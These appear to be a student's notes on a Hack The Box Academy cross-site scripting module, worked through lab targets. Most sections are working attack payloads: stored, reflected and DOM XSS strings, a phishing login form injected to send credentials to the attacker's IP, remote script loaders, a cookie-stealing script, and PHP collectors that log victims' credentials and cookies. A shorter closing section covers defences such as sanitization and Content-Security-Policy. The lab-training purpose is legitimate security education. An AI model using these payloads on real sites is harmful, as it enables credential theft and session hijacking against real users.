## XSS Basics
#### Stored XSS
```
## XSS Testing Payloads
<script>alert(window.origin)</script>

- Look at source code: [CTRL + U] or View Page Source:
<div></div><ul class="list-unstyled" id="todo"><ul><script>alert(window.origin)</script>
</ul></ul>

**Tip:** Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of `window.origin` in the alert box, instead of a static value like `1`. In this case, the alert box would reveal the URL it is being executed on, and will confirm which form is the vulnerable one, in case an IFrame was being used.

## Questions
- Input: <script>alert(document.cookie)</script>
```

#### Reflected XSS
```
- Input a 'test' string to see how input is handled
	-> Seeing a reaction/filtering of input to the website 
	-> Exact same output implies lack of flitering

- use same payload <script>alert(window.origin)</script>

- Look at source code:
<div></div><ul class="list-unstyled" id="todo"><div style="padding-left:25px">Task '<script>alert(window.origin)</script>' could not be added.</div></ul>

- To target a victim with the payload, go to network tab: Copy>Copy URL

## Questions
- Input: <script>alert(document.cookie)</script>
```

#### DOM XSS
```
- Send an input 'test' and look at the response and source code.
	-> Input completely processed by the browser

## Source & Sink
- Common sink of object of JavaScript functions:
document.write()
DOM.innerHTML
DOM.outerHTML

- Common sink  of object of Jquery functions:
add()
after()
append()

- Javacript code of the source on task parameter:
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);

- The sink:
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);

## DOM Attacks
- Trying previous XSS payload fails, as innerHTML does not allow the use of <script> function

- Using payload of
<img src="" onerror=alert(window.origin)>

- To target a user with DOM XSS vulnerability, we can copy the URL from the browser and share it to them.

## Questions:
Use the payload <img src="" onerror=alert(document.cookie)>
```

#### XSS Discovery
```
## Automated Discovery
areaeric@htb[/htb]$ git clone https://github.com/s0md3v/XSStrike.git
areaeric@htb[/htb]$ cd XSStrike
areaeric@htb[/htb]$ pip install -r requirements.txt
areaeric@htb[/htb]$ python xsstrike.py

areaeric@htb[/htb]$ python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 

## Manual Discovery
- Discover through scripting and sending payload.
- Source code review.

## Questions
- Running xsstrike 

- Not directly from the section.
	-> Observe how the website works first. 
	-> register the email got the following:
	http://94.237.49.166:55391/?fullname=test&username=test&password=test&email=test%40gmail.com

	-> much like the section, run it on xsstrike.py

python xsstrike.py -u 'http://94.237.49.166:55391/?fullname=test&username=test&password=test&email=test%40gmail.com'
-> Reflection xss vulnerability on email parameter (Q1), payload:
<A%0doNPoINTERENTer%0a=%0a(prompt)``>v3dm0s 

- Uses a http request and is non-persisitent: reflective xss (Q2)
```
## XSS  Attacks
#### Defacing
```
## Defacing elements
- Consist of:
	- Background Color `document.body.style.background`
	- Background `document.body.background`
	- Page Title `document.title`
	- Page Text `DOM.innerHTML`

## Changing Background
<script>document.body.style.background = "#141d2b"</script>

Tip: Here we set the background color to the default Hack The Box background color. We can use any other hex value, or can use a named color like `= "black"`.

<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>

## Changing Page Title
<script>document.title = 'HackTheBox Academy'</script>

## Changing Page Text
document.getElementById("todo").innerHTML = "New Text"

- if jQuery has been imported, we can do:
$("#todo").html('New Text');

document.getElementsByTagName('body')[0].innerHTML = "New Text"

- Borrowing code from Hack The Box Academy:
<center>
    <h1 style="color: white">Cyber Security Training</h1>
    <p style="color: white">by 
        <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy">
    </p>
</center>

**Tip:** It would be wise to try running our HTML code locally to see how it looks and to ensure that it runs as expected, before we commit to it in our final payload.

- Final payload:
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>

- Looking at source code after refreshing.
```

#### Phishing

```
## XSS Discovery
- Find a webpage with inputs, so try to discover the xss

- Inputting the payload <script>alert(document.cookie)</script> and see how it gets processed on the website:
<img src='<script>alert(document.cookie)</script></div>

-> What we want is something of the form
<img src='....'> <script>...</script>

-> So we can change it like the following
<img src=''><script>alert(document.cookie)</script></div>

with '><script>alert(document.cookie)</script></div> as the payload

- We also learned a new technique for XSS Discovery: Insert payload then tune.

## Login Form Injection
- Example Login form:
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>

- The input form would would look like the following:
<div>
<h3>Please login to continue</h3>
<input type="text" placeholder="Username">
<input type="text" placeholder="Password">
<input type="submit" value="Login">
<br><br>
</div>

- Combine it into a single line:
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');

- Payload injection:
'><script>document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');</script>

## Cleaning up
- [`CTRL+SHIFT+C`] to select and remove elements we don't want (the image url floating thing)

- The form looks like the following html code:
<form role="form" action="index.php" method="GET" id='urlform'>
    <input type="text" placeholder="Image URL" name="url">
</form>

- Remove it using the remove() function:
document.getElementById('urlform').remove();

- Combined one liner for payload:
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();

- Payload injection:
'><script>document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script>

- We can remove the '> part appearing on the page by adding an html openning comment:
...PAYLOAD... <!-- 

- Payload injection:
'><script>document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--

## Credential Stealing
areaeric@htb[/htb]$ sudo nc -lvnp 80

- Changing OUR_IP to our attack IP for payload:
'><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.16.12><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script><!--

-> Final url:
http://10.129.116.42/phishing/index.php?url=%27%3E%3Cscript%3Edocument.write%28%27%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.16.12%3E%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E%27%29%3Bdocument.getElementById%28%27urlform%27%29.remove%28%29%3B%3C%2Fscript%3E%3C%21--

- A PHP file to redirect user traffic to make them think they have successfully logged in:
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
	
- Note change SERVER_IP to the actual server IP:

index.php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://10.129.116.42/phishing/index.php");
    fclose($file);
    exit();
}
?>

- Starting a PHP listenning server:
areaeric@htb[/htb]$ mkdir tmpserver
areaeric@htb[/htb]$ cd tmpserver
areaeric@htb[/htb]$ vim index.php #Created index.php file
areaeric@htb[/htb]$ sudo php -S 0.0.0.0:80

## Questions
- Follow the sections and we are done with demos below
```

#### Session hijacking
```
## Blind XSS Detection
- XSS vulnerability triggered on a page we don't have access to.

- Identify an input page and someone seems to reviewing it after some inputs.

## Loading a Remote Script
<script src="http://OUR_IP/script.js"></script>

- Match to appropriate field:
<script src="http://OUR_IP/username"></script>

- Example payloads from payloads of all things:
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss

<script src=http://OUR_IP></script>

'><script src=http://OUR_IP></script>

"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')

<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>

<script>$.getScript("http://OUR_IP")</script>

- Starting a web server
areaeric@htb[/htb]$ mkdir /tmp/tmpserver
areaeric@htb[/htb]$ cd /tmp/tmpserver
areaeric@htb[/htb]$ sudo php -S 0.0.0.0:80

- Testing payloads on respective field:
<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
<script src=http://OUR_IP/username></script> #this goes inside the username field

Tip: We will notice that the email must match an email format, even if we try manipulating the HTTP request parameters, as it seems to be validated on both the front-end and the back-end. Hence, the email field is not vulnerable, and we can skip testing it. Likewise, we may skip the password field, as passwords are usually hashed and not usually shown in cleartext. This helps us in reducing the number of potentially vulnerable input fields we need to test.

## Session Hijacking
- Some example exploit code for cookie grabbing:
document.location='http://OUR_IP/index.php?c='+document.cookie;

new Image().src='http://OUR_IP/index.php?c='+document.cookie;

- Writing the payload to script.js:
new Image().src='http://OUR_IP/index.php?c='+document.cookie;

- Changing url in the XSS payload found earlier:
<script src=http://OUR_IP/script.js></script>

- Our index.php file:
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>

- Example result obtained:
10.10.10.10:52798 [200]: /script.js
10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2

areaeric@htb[/htb]$ cat cookies.txt 
Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2

- Changing cookie through first pressing [Shift+F9] or storage bar in Developer's tool, then press + button or someway to add cookie

Note:
- blind xss higher success rate with DOM XSS type vulnerability.
- If we can identify that a field is validated or sanitized (e.g. through a combinaton of bypassing front end and testing on the back end, then we don't have to test for such fields. E.g. is email column and password in this exercise)

## Questions

- Loading a remote script
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>

sed -i 's/OUR_IP/10.10.16.12/g' blind_xss_payload

	- Starting a webserver:
mkdir /tmpserver
cd /tmpserver
sudo php -S 0.0.0.0:80


- Sending the payload manually (only 5 payload so no need for automation):
<script src=http://10.10.16.12></script>

'><script src=http://10.10.16.12></script>

"><script src=http://10.10.16.12></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.16.12\';document.body.appendChild(a)')

<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//10.10.16.12");a.send();</script>

<script>$.getScript("http://10.10.16.12")</script>

- Found payload working:
"><script src=http://10.10.16.12></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.16.12\';document.body.appendChild(a)')

- Testing for which field:
"><script src=http://10.10.16.12/fullname></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.16.12\';document.body.appendChild(a)')

"><script src=http://10.10.16.12/username></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.16.12\';document.body.appendChild(a)')

"><script src=http://10.10.16.12/imgurl></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.16.12\';document.body.appendChild(a)')

-> image url section is vulnerable
- Create a script.js file with the payload:
new Image().src='http://10.10.16.12/index.php?c='+document.cookie;

- Write the index.php file in the section:
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>

- Starting the server, delivering the payload and retrieving the cookie:
sudo php -S 0.0.0.0:80

"><script src=http://10.10.16.12/script.js></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.16.12\';document.body.appendChild(a)')

- adding cookie to the page and access http://10.129.55.19/hijacking/login.php
```

## XSS Prevention
#### XSS Prevention
```
## Oveview
- By now, we should have a good understanding of what an XSS vulnerability is and its different types, how to detect an XSS vulnerability, and how to exploit XSS vulnerabilities. 
 
	-> We will conclude the module by learning how to defend against XSS vulnerabilities.

- As discussed previously, XSS vulnerabilities are mainly linked to two parts of the web application: A `Source` like a user input field and a `Sink` that displays the input data.
 
	-> These are the main two points that we should focus on securing, both in the front-end and in the back-end.

- The most important aspect of preventing XSS vulnerabilities is proper input sanitization and validation on both the front and back end.
 
	-> In addition to that, other security measures can be taken to help prevent XSS attacks.

## Front-end
- As the front-end of the web application is where most (but not all) of the user input is taken from, it is essential to sanitize and validate the user input on the front-end using JavaScript.

- Input Validation

	-> For example, in the exercise of the `XSS Discovery` section, we saw that the web application will not allow us to submit the form if the email format is invalid. This was done with the following JavaScript code:

function validateEmail(email) {
    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test($("#login input[name=email]").val());
}

	-> As we can see, this code is testing the `email` input field and returning `true` or `false` whether it matches the Regex validation of an email format.

- Input Sanitization

	-> In addition to input validation, we should always ensure that we do not allow any input with JavaScript code in it, by escaping any special characters. For this, we can utilize the [DOMPurify](https://github.com/cure53/DOMPurify) JavaScript library, as follows:

<script type="text/javascript" src="dist/purify.min.js"></script>
let clean = DOMPurify.sanitize( dirty );

	-> This will escape any special characters with a backslash `\`, which should help ensure that a user does not send any input with special characters (like JavaScript code), which should prevent vulnerabilities like DOM XSS.

- Direct Input

	-> Finally, we should always ensure that we never use user input directly within certain HTML tags, like:

	1. JavaScript code `<script></script>`
	2. CSS Style Code `<style></style>`
	3. Tag/Attribute Fields `<div name='INPUT'></div>`
	4. HTML Comments `<!-- -->`

	-> If user input goes into any of the above examples, it can inject malicious JavaScript code, which may lead to an XSS vulnerability.

## Back-end

	-> On the other end, we should also ensure that we prevent XSS vulnerabilities with measures on the back-end to prevent Stored and Reflected XSS vulnerabilities.
	
	 -> As we saw in the `XSS Discovery` section exercise, even though it had front-end input validation, this was not enough to prevent us from injecting a malicious payload into the form. 
	 
	 -> So, we should have XSS prevention measures on the back-end as well. This can be achieved with Input and Output Sanitization and Validation, Server Configuration, and Back-end Tools that help prevent XSS vulnerabilities.

- Input Validation

	-> Input validation in the back-end is quite similar to the front-end, and it uses Regex or library functions to ensure that the input field is what is expected. 
	
	-> If it does not match, then the back-end server will reject it and not display it.

An example of E-Mail validation on a PHP back-end is the following:

if (filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)) {
    // do task
} else {
    // reject input - do not display it
}

	-> For a NodeJS back-end, we can use the same JavaScript code mentioned earlier for the front-end.

- Input Sanitization

	-> When it comes to input sanitization, then the back-end plays a vital role, as front-end input sanitization can be easily bypassed by sending custom `GET` or `POST` requests. 
	
	-> Luckily, there are very strong libraries for various back-end languages that can properly sanitize any user input, such that we ensure that no injection can occur.

	-> For example, for a PHP back-end, we can use the `addslashes` function to sanitize user input by escaping special characters with a backslash:

addslashes($_GET['email'])

	-> In any case, direct user input (e.g. `$_GET['email']`) should never be directly displayed on the page, as this can lead to XSS vulnerabilities.

	-> For a NodeJS back-end, we can also use the [DOMPurify](https://github.com/cure53/DOMPurify) library as we did with the front-end, as follows:

import DOMPurify from 'dompurify';
var clean = DOMPurify.sanitize(dirty);

- Output HTML Encoding

	-> Another important aspect to pay attention to in the back-end is `Output Encoding`. 
	
	-> This means that we have to encode any special characters into their HTML codes, which is helpful if we need to display the entire user input without introducing an XSS vulnerability.
	
	-> For a PHP back-end, we can use the `htmlspecialchars` or the `htmlentities` functions, which would encode certain special characters into their HTML codes (e.g. `<` into `&lt`), so the browser will display them correctly, but they will not cause any injection of any sort

htmlentities($_GET['email']);

	-> For a NodeJS back-end, we can use any library that does HTML encoding, like `html-entities`, as follows:

import encode from 'html-entities';
encode('<'); // -> '&lt;'

- Server Configuration

	-> In addition to the above, there are certain back-end web server configurations that may help in preventing XSS attacks, such as:

	- Using HTTPS across the entire domain.
	- Using XSS prevention headers.
	- Using the appropriate Content-Type for the page, like `X-Content-Type-Options=nosniff`.
	- Using `Content-Security-Policy` options, like `script-src 'self'`, which only allows locally hosted scripts.
	- Using the `HttpOnly` and `Secure` cookie flags to prevent JavaScript from reading cookies and only transport them over HTTPS.

	-> In addition to the above, having a good `Web Application Firewall (WAF)` can significantly reduce the chances of XSS exploitation, as it will automatically detect any type of injection going through HTTP requests and will automatically reject such requests. 
	
	-> Furthermore, some frameworks provide built-in XSS protection, like [ASP.NET](https://learn.microsoft.com/en-us/aspnet/core/security/cross-site-scripting?view=aspnetcore-7.0).

	-> Once we ensure that all user input is validated, sanitized, and encoded on output, we should significantly reduce the risk of having XSS vulnerabilities.
```

## Skills assessment
```
We are performing a Web Application Penetration Testing task for a company that hired you, which just released their new `Security Blog`. In our Web Application Penetration Testing plan, we reached the part where you must test the web application against Cross-Site Scripting vulnerabilities (XSS).

Start the server below, make sure you are connected to the VPN, and access the `/assessment` directory on the server using the browser:

- Found a comments page, attempting to test it for blind xss (since it seems it is processing user input and admin has to see it first)

- Loading scripts:
-> Open web server 
-> testing payload accordingly on appropriate field (website and comment field. name and email field are handled by filtered by backend accordingly)
sudo php -S 0.0.0.0:80

<script src=http://10.10.16.12></script>

'><script src=http://10.10.16.12></script>

"><script src=http://10.10.16.12></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.16.12\';document.body.appendChild(a)')

<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//10.10.16.12");a.send();</script>

<script>$.getScript("http://10.10.16.12")</script>

-> The following payload worked on one of th field:
'><script src=http://10.10.16.12></script>

-> testing on spcific field:
'><script src=http://10.10.16.12/comment></script>

'><script src=http://10.10.16.12/website></script>

-> Website field is vulnerable

- Create appropriate payload and construct index.php file and construt payload:

script.js:
new Image().src='http://10.10.16.12/index.php?c='+document.cookie;

index.php:
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>

payload:
'><script src=http://10.10.16.12/script.js></script>

- Deliver payload through website field
-> finish. 
```

 
